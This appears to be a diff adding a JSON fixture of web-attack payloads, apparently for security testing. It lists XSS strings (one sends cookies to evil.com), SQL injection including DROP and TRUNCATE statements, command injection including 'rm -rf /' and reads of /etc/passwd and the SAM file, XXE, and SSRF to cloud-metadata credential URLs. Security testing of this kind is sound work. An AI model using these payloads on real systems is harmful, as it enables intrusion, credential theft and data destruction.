@@ -1,0 +1,119 @@
+{
+  "xss": {
+    "scriptTags": [
+      "<script>alert('XSS')</script>",
+      "<script src='http://evil.com/xss.js'></script>",
+      "<script>document.location='http://evil.com?c='+document.cookie</script>"
+    ],
+    "eventHandlers": [
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "<body onload=alert('XSS')>",
+      "<input onfocus=alert('XSS') autofocus>",
+      "<marquee onstart=alert('XSS')>",
+      "<video><source onerror=alert('XSS')>",
+      "<details open ontoggle=alert('XSS')>"
+    ],
+    "hrefJavascript": [
+      "<a href='javascript:alert(1)'>click</a>",
+      "<a href='data:text/html,<script>alert(1)</script>'>click</a>"
+    ],
+    "iframeSrc": [
+      "<iframe src='javascript:alert(1)'></iframe>",
+      "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>"
+    ],
+    "encoded": [
+      "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+      "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+      "%3Cscript%3Ealert('XSS')%3C/script%3E"
+    ],
+    "templateInjection": [
+      "{{constructor.constructor('alert(1)')()}}",
+      "${alert(1)}",
+      "#{alert(1)}"
+    ]
+  },
+  "sqlInjection": {
+    "authentication": [
+      "' OR '1'='1",
+      "' OR '1'='1' --",
+      "' OR '1'='1' /*",
+      "admin'--",
+      "1' OR '1' = '1",
+      "' UNION SELECT * FROM users --"
+    ],
+    "dataExtraction": [
+      "1 UNION SELECT username, password FROM users",
+      "1; SELECT * FROM information_schema.tables",
+      "' UNION SELECT NULL, NULL, NULL --"
+    ],
+    "destructive": [
+      "'; DROP TABLE users; --",
+      "'; DELETE FROM users WHERE '1'='1",
+      "'; TRUNCATE TABLE users; --"
+    ],
+    "blindSql": [
+      "1' AND SLEEP(5) --",
+      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
+      "1' AND SUBSTRING(username,1,1)='a' --"
+    ]
+  },
+  "commandInjection": {
+    "unix": [
+      "; ls -la",
+      "| cat /etc/passwd",
+      "$(whoami)",
+      "`id`",
+      "; rm -rf /"
+    ],
+    "windows": [
+      "| dir",
+      "& ipconfig",
+      "| type C:\\Windows\\System32\\config\\SAM"
+    ]
+  },
+  "pathTraversal": {
+    "basic": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "....//....//....//etc/passwd"
+    ],
+    "encoded": [
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "..%252f..%252f..%252fetc%252fpasswd"
+    ]
+  },
+  "headerInjection": {
+    "crlf": [
+      "value%0d%0aSet-Cookie:session=malicious",
+      "value\r\nX-Injected: header"
+    ]
+  },
+  "xxe": {
+    "basic": [
+      "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
+    ]
+  },
+  "ssrf": {
+    "localNetwork": [
+      "http://localhost/admin",
+      "http://127.0.0.1/",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://[::1]/"
+    ],
+    "cloudMetadata": [
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "http://metadata.google.internal/computeMetadata/v1/"
+    ]
+  },
+  "authBypass": {
+    "jwtManipulation": [
+      "{\"alg\":\"none\"}",
+      "{\"alg\":\"HS256\",\"typ\":\"JWT\"}"
+    ],
+    "headerManipulation": [
+      "X-Forwarded-For: 127.0.0.1",
+      "X-Original-URL: /admin"
+    ]
+  }
+}
